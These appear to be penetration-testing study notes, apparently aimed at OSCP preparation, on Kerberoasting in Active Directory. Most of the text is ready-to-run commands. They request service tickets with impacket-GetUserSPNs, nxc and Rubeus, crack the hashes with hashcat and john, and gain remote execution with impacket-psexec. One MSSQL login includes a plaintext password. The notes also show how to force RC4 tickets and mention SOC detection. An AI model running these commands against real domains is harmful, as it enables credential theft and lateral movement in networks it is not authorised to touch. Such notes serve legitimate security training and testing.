- Attack against **service accounts** (accounts with SPNs) or accounts that are running services 
- Request service tickets for accounts and crack them offline
- Works because service tickets are encrypted with the **service account's password hash**

SPN = Service Principal Name
- It’s basically a **unique identifier**  for a   **service** (like MSSQL, HTTP, CIFS, LDAP) to the user or computer account running it.

Steps:
1. Request service ticket for any service account
2. Service ticket is encrypted with service account's NT hash
3. Extract the encrypted ticket and crack it offline
4. Get plaintext password of service account


GetUserSPNs.py:

```sh
#Since our Kali machine is not joined to the domain, we also must provide domain user credentials to obtain the TGS-REP hash
#we user a any domain user
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

#$krb5tgs$23$*iis_service$CORP.COM$corp.com/
#user iss_service 

# Using nxc
nxc ldap <DC_IP> -u <user> -p <pass> --kerberoasting

# Using Rubeus (Windows)
 .\Rubeus.exe kerberoast /nowrap /simple /domain:[DOMAIN] /outfile:kerberoast-ticket.txt
 
Rubeus.exe kerberoast /outfile:hashes.txt

#powershell 
Get-NetUser -SPN 
```


Cracking with dictionary of passwords:

```
hashcat -m 13100 --force <TGSs_file> <wordlist>

john --format=krb5tgs --wordlist=<wordlist> <AS_REP_responses_file>
```

psexec 
```
impacket-psexec <domain_name>/<domain_user>@<domain_ip>
```

sql service account
```sh
impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth
```


### Kerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled

It is possible to kerberoast a user account with SPN even if the account supports Kerberos AES encryption by requesting an RC4 ecnrypted (instead of AES) TGS which easier to crack.

confirmed that spn is set

```
Get-NetUser -SPN sandy
```

Since the user account does not support Kerberos AES ecnryption by default, when requesting a TGS ticket for kerberoasting with rubeus, we will get an RC4 encrypted ticket:

```
F:\Rubeus\Rubeus.exe kerberoast /user:sandy
```


By default, returned tickets will be encrypted with the highest possible encryption algorithm, which is AES:

```
F:\Rubeus\Rubeus.exe kerberoast /tgtdeleg
```

Even though AES encryption is supported by both parties, a TGS ticket encrypted with RC4 (encryption type 0x17/23) was returned. Note that SOCs may be monitoring for tickets encrypted with RC4 

![[image.avif]]